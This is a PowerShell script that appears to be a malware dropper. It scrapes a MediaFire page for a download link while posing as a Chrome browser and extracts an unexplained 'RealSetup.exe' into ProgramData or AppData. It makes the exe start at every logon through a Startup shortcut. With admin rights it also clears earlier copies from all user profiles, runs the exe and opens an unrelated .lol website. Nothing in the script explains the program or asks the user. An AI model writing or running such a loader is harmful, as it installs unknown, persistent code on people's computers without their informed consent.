# ==============================
# 1. Variables & Path Resolution
# ==============================
$mediaFireUrl = "https://www.mediafire.com:443/file/?/"
$runExe = $false
$openUrl = $false
$exeName = "RealSetup.exe"
$folderName = "Real"
$zipName = "$folderName.zip"
$shortcutName = "$folderName.lnk"
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    $runExe = $true
    $openUrl = $true
    $targetPath = $env:ProgramData
    $startmenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
} else {
    $targetPath = $env:LocalAppData
    $startmenuPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
}
$zipPath = Join-Path $targetPath $zipName
$extractPath = Join-Path $targetPath $folderName
$shortcutFile = Join-Path $startmenuPath $shortcutName
# ==============================
# 2. Prepare extraction directory
# ==============================
$pathsToClean = @(
    $extractPath
    $shortcutFile
)
if ($isAdmin) {
    $profilePaths = Get-CimInstance Win32_UserProfile -ErrorAction Stop | Where-Object { -not $_.Special -and $_.LocalPath } | Select-Object -ExpandProperty LocalPath -Unique
    foreach ($profilePath in $profilePaths) {
        $pathsToClean += Join-Path $profilePath "AppData\Local\$folderName"
        $pathsToClean += Join-Path $profilePath "AppData\Local\$zipName"
        $pathsToClean += Join-Path $profilePath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$shortcutName"
    }
}
foreach ($path in $pathsToClean) {
    if (Test-Path -LiteralPath $path) {
        Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction Stop
    }
}
New-Item -ItemType Directory -Path $extractPath -Force -ErrorAction Stop | Out-Null
# ==============================
# 3. Get MediaFire page
# ==============================
$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
}
Write-Host "Getting MediaFire page..."
try {
    $page = Invoke-WebRequest `
        -Uri $mediaFireUrl `
        -Headers $headers `
        -UseBasicParsing `
        -MaximumRedirection 10 `
        -TimeoutSec 60 `
        -ErrorAction Stop
}
catch {
    throw "Could not access MediaFire page: $($_.Exception.Message)"
}
# ==============================
# 4. Find download URL
# ==============================
$directUrl = $null
# First try parsed links
$directUrl = $page.Links |
    Where-Object {
        $_.href -and
        $_.href -match 'download.*mediafire\.com'
    } |
    Select-Object -ExpandProperty href -First 1
# If that failed, search raw HTML
if (-not $directUrl) {
    $pattern = 'https?://[^"''<>\s]+mediafire\.com[^"''<>\s]*'
    $matches = [regex]::Matches($page.Content, $pattern)
    foreach ($match in $matches) {
        if ($match.Value -match 'download') {
            $directUrl = $match.Value
            break
        }
    }
}
if (-not $directUrl) {
    throw "Could not locate the MediaFire download URL."
}
Write-Host ""
Write-Host "Direct URL:"
Write-Host $directUrl
Write-Host ""
# ==============================
# 5. Download using curl.exe
# ==============================
if (Test-Path -LiteralPath $zipPath) {
    Remove-Item -LiteralPath $zipPath -Force
}
Write-Host "Downloading to:"
Write-Host $zipPath
$curlArgs = @(
    "--location"
    "--fail"
    "--retry", "3"
    "--retry-delay", "2"
    "--connect-timeout", "30"
    "--max-time", "600"
    "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "-o", $zipPath
    $directUrl
)
& curl.exe @curlArgs
if ($LASTEXITCODE -ne 0) {
    throw "curl download failed with exit code $LASTEXITCODE"
}
# ==============================
# 6. Verify download
# ==============================
if (-not (Test-Path -LiteralPath $zipPath)) {
    throw "Download failed: file was not created."
}
$file = Get-Item -LiteralPath $zipPath
Write-Host "Downloaded:"
Write-Host "$($file.FullName)"
Write-Host "Size: $($file.Length) bytes"
if ($file.Length -lt 1000) {
    throw "Downloaded file is suspiciously small."
}
# ==============================
# 7. Extract
# ==============================
Write-Host "Extracting..."
& tar.exe -xf $zipPath -C $extractPath
if ($LASTEXITCODE -ne 0) {
    throw "tar extraction failed with exit code $LASTEXITCODE"
}
# ==============================
# 8. Link in Start Up
# ==============================
$exePath = Join-Path $extractPath $exeName
if (-not (Test-Path -LiteralPath $exePath)) {
    throw "EXE not found: $exePath"
}
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($shortcutFile)
$Shortcut.TargetPath = $exePath
$Shortcut.WorkingDirectory = Split-Path -Parent $exePath
$Shortcut.Save()
# ==============================
# 9. Run EXE & Open Ryos Real
# ==============================
if ($runExe) {
    Write-Host "Starting $exePath"
    Start-Process -FilePath $exePath
} else {
    Write-Host "Skipping EXE launch."
}
Write-Host "Removing $zipPath"
Remove-Item -LiteralPath $zipPath -Force
if ($openUrl) {
    Start-Process "https://www.whuskalc.lol:443/essential/_page.html"
} else {
    Write-Host "Skipping Url launch."
}
Write-Host "Done!"; [Environment]::Exit(0)
